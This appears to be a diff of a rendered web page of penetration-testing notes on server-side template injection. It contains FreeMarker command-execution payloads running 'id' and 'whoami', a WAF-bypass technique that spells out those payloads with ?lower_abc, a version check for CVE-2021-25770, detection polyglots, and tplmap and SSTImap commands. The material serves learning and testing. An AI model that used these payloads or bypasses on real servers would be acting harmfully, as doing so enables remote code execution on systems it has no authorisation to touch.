-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/etc/passwd&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/etc/passwd&#39;</span>
 </span></span><span style="display:flex;"><span>print(s<span style="color:#f92672">.</span>hex())
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>OUTPUT:
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;2f6574632f706173737764&#39;</span>
-</span></span></code></pre></div><h3 id="bypassing-filters--freemarker-java-">
-  Bypassing Filters [ Freemarker Java ]
-  <a class="anchor" href="#bypassing-filters--freemarker-java-">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;2f6574632f706173737764&#39;</span></span></span></code></pre></div><h3 id="bypassing-filters--freemarker-java-">Bypassing Filters [ Freemarker Java ]<a class="anchor" href="#bypassing-filters--freemarker-java-">#</a></h3>
 <ul>
 <li><code>?lower_abc</code> and <code>?upper_abc</code></li>
 <li>The basic payload ⇒</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span><span style="color:#f92672">()</span>exec<span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>id<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()exec(<span style="color:#960050;background-color:#1e0010">&#39;</span>id<span style="color:#960050;background-color:#1e0010">&#39;</span>)}</span></span></code></pre></div><ul>
 <li>Many <code>WAF</code> used to block certain character and words to mitigate the attack</li>
 <li>We can bypass this types of filters by using the in built functions such as <strong><code>?lower_abc</code></strong> and</li>
 </ul>
@@ -1850,45 +1689,29 @@ Template Engine
 <ul>
 <li>This functions used to map the characters according to the numbers in alphabetical order, as</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span>lower_abc	   a
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span><span style="color:#f92672">?</span>lower_abc	   b
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span><span style="color:#f92672">?</span>lower_abc	   f
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">24</span><span style="color:#f92672">?</span>lower_abc	 x
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>upper_abc	   E
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1<span style="color:#f92672">?</span>lower_abc	   a
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">?</span>lower_abc	   b
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">?</span>lower_abc	   f
+</span></span><span style="display:flex;"><span>24<span style="color:#f92672">?</span>lower_abc	 x
+</span></span><span style="display:flex;"><span>5<span style="color:#f92672">?</span>upper_abc	   E</span></span></code></pre></div><ul>
 <li>We can use this function to generate the payload as</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span><span style="color:#f92672">()</span>exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">)}</span>
-</span></span></code></pre></div><p>to this ⇒</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{(</span><span style="color:#ae81ff">6</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1.1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1.1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1.1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>upper_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">)?</span><span style="color:#66d9ef">new</span><span style="color:#f92672">()(</span><span style="color:#ae81ff">9</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">)}</span>
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()exec(<span style="color:#e6db74">&#34;id&#34;</span>)}</span></span></code></pre></div><p>to this ⇒</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${(6<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>18<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>13<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>18<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>11<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>18<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1.<span style="color:#a6e22e">1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span>1<span style="color:#f92672">]+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>13<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>16<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>12<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1.<span style="color:#a6e22e">1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span>1<span style="color:#f92672">]+</span>21<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>9<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>12<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>9<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>25<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1.<span style="color:#a6e22e">1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span>1<span style="color:#f92672">]+</span>5<span style="color:#f92672">?</span>upper_abc<span style="color:#f92672">+</span>24<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>3<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>21<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc)<span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(9<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>4<span style="color:#f92672">?</span>lower_abc)}</span></span></code></pre></div><ul>
 <li>This ⇒</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span><span style="color:#f92672">()</span>exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;whoami&#34;</span><span style="color:#f92672">)}</span>
-</span></span></code></pre></div><p>to this ⇒</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{(</span><span style="color:#ae81ff">6</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1.1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1.1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1.1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>upper_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">)?</span><span style="color:#66d9ef">new</span><span style="color:#f92672">()(</span><span style="color:#ae81ff">23</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">)}</span>
-</span></span></code></pre></div><h3 id="cve-2021-25770">
-  CVE-2021-25770
-  <a class="anchor" href="#cve-2021-25770">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()exec(<span style="color:#e6db74">&#34;whoami&#34;</span>)}</span></span></code></pre></div><p>to this ⇒</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${(6<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>18<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>13<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>18<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>11<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>18<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1.<span style="color:#a6e22e">1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span>1<span style="color:#f92672">]+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>13<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>16<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>12<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1.<span style="color:#a6e22e">1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span>1<span style="color:#f92672">]+</span>21<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>9<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>12<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>9<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>25<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1.<span style="color:#a6e22e">1</span><span style="color:#f92672">?</span>c<span style="color:#f92672">[</span>1<span style="color:#f92672">]+</span>5<span style="color:#f92672">?</span>upper_abc<span style="color:#f92672">+</span>24<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>3<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>21<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>20<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>5<span style="color:#f92672">?</span>lower_abc)<span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(23<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>8<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>15<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>1<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>13<span style="color:#f92672">?</span>lower_abc<span style="color:#f92672">+</span>9<span style="color:#f92672">?</span>lower_abc)}</span></span></code></pre></div><h3 id="cve-2021-25770">CVE-2021-25770<a class="anchor" href="#cve-2021-25770">#</a></h3>
 <ul>
 <li>We can check for the <strong><code>Freemarker</code></strong> version as</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span>assign the_version<span style="color:#f92672">=.</span><span style="color:#a6e22e">version</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>the_version<span style="color:#f92672">}</span>
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span>assign the_version<span style="color:#f92672">=</span>.<span style="color:#a6e22e">version</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>${the_version}</span></span></code></pre></div><ul>
 <li>If the version is <strong><code>&lt; 2.3.30</code></strong>  It is vulnerable</li>
 <li>We can use the <strong><code>freemarker.template.utility.Execute()</code></strong> to run arbitrary commands</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#75715e">#assign ex = &#34;freemarker.template.utility.Execute&#34;?new()&gt;${ ex(&#34;id&#34;) } </span>
-</span></span></code></pre></div><h2 id="detection">
-  Detection
-  <a class="anchor" href="#detection">#</a>
-</h2>
-<h3 id="manual-techniques">
-  Manual Techniques
-  <a class="anchor" href="#manual-techniques">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#75715e">#assign ex = &#34;freemarker.template.utility.Execute&#34;?new()&gt;${ ex(&#34;id&#34;) } </span></span></span></code></pre></div><h2 id="detection">Detection<a class="anchor" href="#detection">#</a></h2>
+<h3 id="manual-techniques">Manual Techniques<a class="anchor" href="#manual-techniques">#</a></h3>
 <p><strong>Identify the injection point</strong></p>
 <ul>
 <li>Identify if some of the user controllable input is reflecting in the http response</li>
@@ -1899,30 +1722,25 @@ Template Engine
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{{<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lt</span>;<span style="color:#f92672">%</span>[<span style="color:#f92672">%</span><span style="color:#960050;background-color:#1e0010">&#39;&#34;</span>}}<span style="color:#f92672">%\</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{{<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lt</span>;<span style="color:#f92672">%</span>[<span style="color:#f92672">%</span><span style="color:#960050;background-color:#1e0010">&#39;&#34;</span>}}<span style="color:#f92672">%\</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span><span style="color:#f92672">&lt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">$$</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">123</span>;<span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">123</span>;<span style="color:#f92672">%</span>
 </span></span><span style="display:flex;"><span>}}
 </span></span><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}}
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}
-</span></span><span style="display:flex;"><span>[[<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>]]
-</span></span></code></pre></div><p><strong>Identify the template engine</strong></p>
+</span></span><span style="display:flex;"><span>[[<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>]]</span></span></code></pre></div><p><strong>Identify the template engine</strong></p>
 <ul>
 <li>One can follow this tree to identify the template engine used by the application</li>
 </ul>
-<p>
-  <img src="../ssti.png" alt="SSTI.png" /></p>
+<p><img src="../ssti.png" alt="SSTI.png" /></p>
 <ul>
 <li>Starting at very left, including the parameter into my request.</li>
 <li>Following **<code>Green arrow</code>**when ⇒ The expression is evaluated (i.e <strong>49</strong>)</li>
 <li>Following <strong><code>Red arrow</code></strong>   when ⇒ The expression is shown in the output (i.e <strong>${7*7}</strong>)</li>
 <li>Sometimes You can try to trigger a Template Error to get some data back which can reveal the template engine name itself.</li>
 </ul>
-<h3 id="automated-techniques">
-  Automated Techniques
-  <a class="anchor" href="#automated-techniques">#</a>
-</h3>
+<h3 id="automated-techniques">Automated Techniques<a class="anchor" href="#automated-techniques">#</a></h3>
 <ul>
 <li><strong><code>Tplmap</code></strong>
 <ul>
@@ -1931,8 +1749,7 @@ Template Engine
 </li>
 </ul>
 <p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noreferrer noopener nofollow">https://github.com/epinna/tplmap</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./tplmap.py -u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John&#39;</span>
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./tplmap.py -u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John&#39;</span></span></span></code></pre></div><ul>
 <li><strong><code>SSTImap</code></strong>
 <ul>
 <li>SSTImap is a penetration testing software that can check websites for Code Injection and Server-Side Template Injection vulnerabilities and exploit them, giving access to the operating system itself.</li>
@@ -1940,16 +1757,14 @@ Template Engine
 </li>
 </ul>
 <p><a href="https://github.com/vladko312/SSTImap" target="_blank" rel="noreferrer noopener nofollow">https://github.com/vladko312/SSTImap</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./sstimap.py -u https://example.com/page?name<span style="color:#f92672">=</span>John
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./sstimap.py -u https://example.com/page?name<span style="color:#f92672">=</span>John</span></span></code></pre></div><ul>
 <li>
 <p><strong><code>Fuzzing</code></strong></p>
 <ul>
 <li>ffuf</li>
